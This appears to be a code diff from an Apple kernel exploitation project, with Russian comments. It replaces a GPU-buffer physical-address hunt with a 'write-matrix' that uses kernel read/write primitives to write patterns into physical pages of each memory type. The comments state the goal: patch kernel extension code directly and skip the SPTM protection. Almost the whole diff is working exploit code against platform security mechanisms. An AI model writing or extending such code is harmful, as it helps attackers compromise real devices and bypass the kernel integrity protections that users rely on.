@@ -5362,39 +5362,13 @@ static BOOL kpHuntPtrOK(uint64_t v)
     GNOTE( [NSString stringWithFormat:@"  цепь: uc=%#llx accel=%#llx gart=%#llx uat=%#llx mapper=%#llx L1arr=%#llx",
                agxuc, accel, gart, uat, mapper, L1arr]);
 
-    // 3. HUNT v6: phys-scan от содержимого. CPU-side mapper НЕ авторитетен
-    //    для Metal-буферов (v4/v5: PTE=0 при рабочем GPU — FW пишет свои
-    //    таблицы). План: шейдер пишет 16-байтную сигнатуру в КАЖДУЮ страницу
-    //    private-буфера → скан DRAM (типы 0x21/0x0b — читаемость доказана)
-    //    → реальные PA буфера → скан таблиц 0x17 → сам PTE-слот и L3 →
-    //    обратная цепь L3→L2→L1 root → охота за mapper'ом корня.
-
-    // 3a. bufB + сигнатурный шейдер (17 потоков = 17 страниц)
-    id<MTLDevice> mtl = MTLCreateSystemDefaultDevice();
-    id<MTLBuffer> bufB = mtl ? [mtl newBufferWithLength:0x44000 options:MTLResourceStorageModePrivate] : nil;
-    if (!bufB) { GNOTE( @"FAIL: private buffer"); gGartLive = NO; return r; }
-    uint64_t gvaB = (uint64_t)bufB.gpuAddress;
-    GNOTE( [NSString stringWithFormat:@"  priv B: gpuAddr=%#llx len=0x44000 (17 страниц сигнатур)", gvaB]);
-    @autoreleasepool {
-        NSError *err = nil;
-        id<MTLLibrary> lib = [mtl newLibraryWithSource:
-            @"kernel void sg(device ulong *o [[buffer(0)]], uint i [[thread_position_in_grid]]) { device ulong *p = (device ulong *)((device char *)o + (ulong)i * 0x4000); p[0] = 0x4242424242424242UL; p[1] = 0x1337133713371337UL; }"
-            options:nil error:&err];
-        id<MTLFunction> fn = lib ? [lib newFunctionWithName:@"sg"] : nil;
-        id<MTLComputePipelineState> pipe = fn ? [mtl newComputePipelineStateWithFunction:fn error:&err] : nil;
-        id<MTLCommandQueue> q = pipe ? [mtl newCommandQueue] : nil;
-        id<MTLCommandBuffer> cb = q ? [q commandBuffer] : nil;
-        id<MTLComputeCommandEncoder> enc = cb ? [cb computeCommandEncoder] : nil;
-        if (enc) {
-            [enc setComputePipelineState:pipe];
-            [enc setBuffer:bufB offset:0 atIndex:0];
-            [enc dispatchThreads:MTLSizeMake(17,1,1) threadsPerThreadgroup:MTLSizeMake(17,1,1)];
-            [enc endEncoding];
-            [cb commit];
-            [cb waitUntilCompleted];
-            GNOTE( [NSString stringWithFormat:@"  submit B(сигнатуры): status=%ld %@", (long)cb.status, cb.error ? cb.error.description : @"ok"]);
-        } else GNOTE( [NSString stringWithFormat:@"  submit B: оборвался: %@", err]);
-    }
+    // 3. WRITE-MATRIX: phys буфера живёт ТОЛЬКО в 0x17 (page-list + PTE,
+    //    heap-копии нет — v8). GXF-injection мёртв. Но 0x0e = kext TEXT в
+    //    managed DRAM (читается апертурой!). Тестируем записываемость ВСЕХ
+    //    типов через physmap write: если kext text пишется — патч кода
+    //    напрямую, SPTM-байпас не нужен. Метод: нулевой qword страницы →
+    //    pattern → readback → restore. Паника на типе = тип защищён
+    //    (виновник виден в syslog последней строкой).
 
     // 3b. frame table enum ЧАНКАМИ (4КБ = 256 записей за read): гистограмма
     //     типов + мастер-список {ppn,type} + список heap-страниц для sig-скана.
@@ -5429,117 +5403,75 @@ static BOOL kpHuntPtrOK(uint64_t v)
     }
     GNOTE( [NSString stringWithFormat:@"  heap/userland страниц: %u", nheap]);
 
-    // 3c. sig-скан heap-страниц → PA страниц bufB
-    uint64_t sigPA[40]; int nsig = 0;
-    for (uint32_t i = 0; i < nheap && nsig < 40; i++) {
-        uint64_t pa = pb + ((uint64_t)heapPages[i] << 14);
-        uint64_t va = gPrimitives.phystokv(pa);
-        uint8_t two[16];
-        kreadbuf(va, two, 16);
-        uint64_t s0, s1;
-        memcpy(&s0, two, 8); memcpy(&s1, two + 8, 8);
-        if (s0 != 0x4242424242424242ULL || s1 != 0x1337133713371337ULL) continue;
-        sigPA[nsig++] = pa;
-        GNOTE( [NSString stringWithFormat:@"★ bufB страница #%d: PA=%#llx", nsig - 1, pa]);
-        if (i && (i & 0x7FFF) == 0)
-            GNOTE( [NSString stringWithFormat:@"  sig-скан: %u/%u…", i, nheap]);
+    // 3c. write-test по каждому типу: ищем НУЛЕВОЙ qword (до 8 страниц на
+    //     тип), пишем pattern, readback, restore. 0x0b/0x21 — контроль
+    //     (заведомо пишутся, валидируют метод). 0x17/0x02 пропускаем
+    //     (0x17 — известный фолт на записи, 0x02 — frame table, «не пишется»).
+    extern void kp_rc_kwrite64(uint64_t, uint64_t);
+    static const uint8_t wtest[] = {
+        0x0b, 0x21, 0x0e, 0x13, 0x37, 0x06, 0x09, 0x11, 0x18, 0x14, 0x0c, 0x10,
+        0x01, 0x03, 0x04, 0x05, 0x27, 0x28, 0x29, 0x2a, 0x2b, 0x2c, 0x2e, 0x2f,
+        0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x38, 0x39, 0x3a, 0x1b, 0x1c,
+        0x15, 0x16, 0x08, 0x0a, 0x12,
+    };
+    for (int wi = 0; wi < (int)sizeof(wtest); wi++) {
+        uint8_t t = wtest[wi];
+        if (!typeCount[t]) continue;
+        GNOTE( [NSString stringWithFormat:@"  write-test типа 0x%02x (%u страниц)…", t, typeCount[t]]);
+        BOOL done = NO;
+        uint32_t tried = 0;
+        for (uint32_t i = 0; i < nall && tried < 8 && !done; i++) {
+            if ((uint32_t)(allPages[i] >> 32) != t) continue;
+            tried++;
+            uint64_t pa = pb + ((uint64_t)(uint32_t)allPages[i] << 14);
+            uint64_t va = gPrimitives.phystokv(pa);
+            uint8_t pgch[0x1000];
+            int zslot = -1;
+            for (int seg = 0; seg < 4 && zslot < 0; seg++) {
+                kreadbuf(va + (uint64_t)seg * 0x1000, pgch, 0x1000);
+                for (int q = 0; q < 512; q++) {
+                    uint64_t v;
+                    memcpy(&v, pgch + q * 8, 8);
+                    if (!v) { zslot = seg * 512 + q; break; }
+                }
+            }
+            if (zslot < 0) continue;
+            uint64_t slotVA = va + (uint64_t)zslot * 8;
+            GNOTE( [NSString stringWithFormat:@"    нулевой qword: page=%#llx slot=%d", pa, zslot]);
+            kp_rc_kwrite64(slotVA, 0x4141414141414141ULL);
+            uint64_t rb = kp_rc_kread64(slotVA);
+            BOOL stuck = (rb == 0x4141414141414141ULL);
+            kp_rc_kwrite64(slotVA, 0);
+            uint64_t rb2 = kp_rc_kread64(slotVA);
+            GNOTE( [NSString stringWithFormat:@"    → 0x%02x %@ (rb=%#llx, restore=%#llx)", t,
+                       stuck ? @"ПИШЕТСЯ ★★★" : @"не пишется (молча)", rb, rb2]);
+            done = YES;
+        }
+        if (!done) GNOTE( [NSString stringWithFormat:@"    → 0x%02x: нулевого qword не нашлось за 8 страниц", t]);
     }
-    GNOTE( [NSString stringWithFormat:@"  sig-скан: найдено %d страниц bufB", nsig]);
 
-    // 3d. 0x17: переобнаружить структуры буфера (page-list {phys,1} и PTE
-    //     0xc00…c88) и сдампить их заголовки (первые 16 qword страницы) —
-    //     там могут быть магии/обратные указатели, идентифицирующие владельца.
-    if (nsig) {
-        uint64_t listPage = 0, ptePage = 0;
-        for (uint32_t i = 0; i < nall && (!listPage || !ptePage); i++) {
-            if ((uint32_t)(allPages[i] >> 32) != 0x17) continue;
-            uint64_t pa = pb + ((uint64_t)(uint32_t)allPages[i] << 14);
-            uint64_t va = gPrimitives.phystokv(pa);
-            uint8_t pgch[0x1000];
-            for (int seg = 0; seg < 4; seg++) {
-                kreadbuf(va + (uint64_t)seg * 0x1000, pgch, 0x1000);
-                for (int q = 0; q < 512; q++) {
-                    uint64_t v;
-                    memcpy(&v, pgch + q * 8, 8);
-                    uint64_t vm = v & 0xFFFFFFFFF000ULL;
-                    if (!vm) continue;
-                    for (int ni = 0; ni < nsig; ni++) {
-                        if (vm != sigPA[ni]) continue;
-                        if ((v >> 56) == 0xc0) { if (!ptePage) ptePage = pa; }
-                        else if (!(v & 0xFFFULL)) { if (!listPage) listPage = pa; }
-                        break;
-                    }
-                    if (listPage && ptePage) break;
-                }
-                if (listPage && ptePage) break;
-            }
-        }
-        GNOTE( [NSString stringWithFormat:@"  0x17: page-list=%#llx PTE-table=%#llx", listPage, ptePage]);
-        for (int wp = 0; wp < 2; wp++) {
-            uint64_t pa = wp ? ptePage : listPage;
-            if (!pa) continue;
-            GNOTE( [NSString stringWithFormat:@"  --- заголовок %s %#llx:", wp ? "PTE-table" : "page-list", pa]);
-            uint8_t hd[0x80];
-            kreadbuf(gPrimitives.phystokv(pa), hd, 0x80);
-            for (int q = 0; q < 16; q += 2) {
-                uint64_t a0, a1;
-                memcpy(&a0, hd + q * 8, 8); memcpy(&a1, hd + q * 8 + 8, 8);
-                GNOTE( [NSString stringWithFormat:@"    [%2d] %#llx %#llx", q, a0, a1]);
-            }
-        }
-
-        // 3e. ГЛАВНОЕ: heap (0x21) — есть ли копия phys (дескриптор ranges,
-        //     который драйвер читает при map)? 20k страниц.
-        int hits = 0;
-        GNOTE( [NSString stringWithFormat:@"  скан типа 0x21 (heap, %u страниц)…", typeCount[0x21]]);
-        for (uint32_t i = 0; i < nall && hits < 24; i++) {
-            if ((uint32_t)(allPages[i] >> 32) != 0x21) continue;
-            uint64_t pa = pb + ((uint64_t)(uint32_t)allPages[i] << 14);
-            uint64_t va = gPrimitives.phystokv(pa);
-            uint8_t pgch[0x1000];
-            for (int seg = 0; seg < 4 && hits < 24; seg++) {
-                kreadbuf(va + (uint64_t)seg * 0x1000, pgch, 0x1000);
-                for (int q = 0; q < 512; q++) {
-                    uint64_t v;
-                    memcpy(&v, pgch + q * 8, 8);
-                    uint64_t vm = v & 0xFFFFFFFFF000ULL;
-                    if (!vm) continue;
-                    for (int ni = 0; ni < nsig; ni++) {
-                        if (vm != sigPA[ni]) continue;
-                        GNOTE( [NSString stringWithFormat:@"★ HEAP HIT: page=%#llx slot=%d val=%#llx (bufB[%d])", pa, seg * 512 + q, v, ni]);
-                        for (int c = q - 4; c <= q + 4; c++) {
-                            if (c < 0 || c >= 512) continue;
-                            uint64_t cv;
-                            memcpy(&cv, pgch + c * 8, 8);
-                            GNOTE( [NSString stringWithFormat:@"    ctx[%+d] = %#llx", c - q, cv]);
-                        }
-                        hits++;
-                        break;
-                    }
-                }
-            }
-        }
-        GNOTE( [NSString stringWithFormat:@"  heap-скан: hits=%d", hits]);
-
-        // 3f. 0x0e: идентификация загадочного типа (74-80k страниц) — сэмпл.
-        uint32_t sampled = 0;
-        for (uint32_t i = 0; i < nall && sampled < 3; i++) {
-            if ((uint32_t)(allPages[i] >> 32) != 0x0e) continue;
+    // 3d. идентификация типов: первые 8 qword сэмпла (read-only)
+    static const uint8_t sampleT[] = {0x06, 0x13, 0x37, 0x09, 0x11, 0x18, 0x14, 0x02};
+    for (int si = 0; si < (int)sizeof(sampleT); si++) {
+        uint8_t t = sampleT[si];
+        if (!typeCount[t]) continue;
+        for (uint32_t i = 0; i < nall; i++) {
+            if ((uint32_t)(allPages[i] >> 32) != t) continue;
             uint64_t pa = pb + ((uint64_t)(uint32_t)allPages[i] << 14);
             uint8_t sm[0x40];
             kreadbuf(gPrimitives.phystokv(pa), sm, 0x40);
-            NSMutableString *s = [NSMutableString stringWithFormat:@"  0x0e сэмпл %#llx:", pa];
+            NSMutableString *s = [NSMutableString stringWithFormat:@"  0x%02x сэмпл %#llx:", t, pa];
             for (int q = 0; q < 8; q++) {
                 uint64_t v;
                 memcpy(&v, sm + q * 8, 8);
                 [s appendFormat:@" %#llx", v];
             }
             GNOTE( s);
-            sampled++;
+            break;
         }
     }
     free(heapPages); free(allPages);
-    GNOTE( @"  hunt v8 завершён");
+    GNOTE( @"  write-matrix завершена");
     gGartLive = NO;
     return r;
 }
